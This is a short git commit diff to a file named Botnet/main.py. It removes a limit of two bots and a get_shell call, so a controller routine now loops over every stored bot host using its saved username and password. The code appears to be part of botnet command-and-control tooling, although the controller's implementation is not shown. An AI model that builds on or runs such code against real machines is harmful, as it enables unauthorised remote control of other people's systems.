0850b5912eb3b0ed42a0d52585a1200acfbe7488
Marcus <88283829+PyMarcus@users.noreply.github.com>
2023-04-16 22:54:28 -0400

    final main

--- Botnet/main.py
+++ Botnet/main.py
@@ -7,15 +7,7 @@ if __name__ == '__main__':
     i = 0
     for bot in bs.get_all_bots():
         bsx: BotnetServer = BotnetServer()
-        if i == 2:
-            break
         bsx.general_controller(bot.host,
                               bot.username,
                               bot.password,
                               4)
-
-        bsx.get_shell(bot.host,
-                              bot.username,
-                              bot.password,
-                              4)
-        i+=1
